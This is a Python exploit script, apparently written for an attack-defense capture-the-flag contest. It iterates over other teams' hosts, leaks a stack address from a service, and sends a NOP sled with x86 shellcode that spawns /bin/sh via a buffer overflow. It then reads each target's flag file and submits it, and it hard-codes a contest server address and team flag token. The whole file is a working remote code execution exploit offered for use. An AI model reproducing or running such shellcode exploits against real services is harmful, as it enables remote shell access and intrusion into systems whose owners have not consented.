#!/usr/bin/env python

import swpag_client
import pwn

URL = "34.211.129.130"
TEAM_URL = "http://" + URL + "/"
TEAM_FLAG_TOKEN = "i5RFobhxbx8TCO1dTKWN"
SERVICE_ID = 4 # Update for each exploit to target the correct service
EXCLUDE_TEAM_NAME = "Team 31"

def module_name():
  return "sampleak-exploit"

def module_help():
  return "a sampleak exploit to be thrown by the auto-runner module"

def module_usage():
  return "{0}".format(module_name())

def main():
  try: 
    team = swpag_client.Team(TEAM_URL, TEAM_FLAG_TOKEN)
    
    #print(team.get_targets(SERVICE_ID))
    EXCLUDE_HOSTNAMES = [EXCLUDE_TEAM_NAME, "localhost"]

    for target in team.get_targets(SERVICE_ID):
      try:
        # Ignore our own team
        if target["hostname"] in EXCLUDE_HOSTNAMES:
          continue

        flag_id = target["flag_id"]
        hostname = target["hostname"]
        port = target["port"]

        print("Running exploit on {0}:{1} -> {2}".format(hostname, port, flag_id))

        flag_obtained = None
      
        process = pwn.remote(hostname, 10004)
        process.readuntil('id ')                                
        x = process.readuntil(')') 
        x = x[0:10] 
        pwn.enhex(x) 
        try:
          x = int(x) - 36 - 88
          z = hex(x)
        except Exception as e:
          process.close()
          continue
        y = pwn.p32(x) 
        process.readuntil('?') 
        process.write('R\n') 
        process.readuntil('password\n') 
        process.write('\n')
        process.write('12345') 
        process.send('\n') 
        process.write((b'\x90'*20)+(b'\x68\x01\x01\x01\x01\x81\x34\x24\x2e\x72\x69\x01\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x31\xd2\x6a\x16\x58\xd1\xe8\xcd\x80')+(b'\x90'*30) + y +(b'\x44'*20)) 
        process.send('\n') 
        process.send('\n') 
        print(process.readuntil('password!'))
        process.send('\n')
        process.send('\n')
        print('cat ' + target['flag_id']) 
        print(process.send("cat " + target["flag_id"] + "\n"))
        aaaa = process.recvall(timeout=2).strip("\r\n")
        print(team.submit_flag([aaaa]))
        process.close()
      except Exception as e:
        process.close()
        continue

  except Exception as e:
    print(e)

if __name__ == "__main__":
  main()
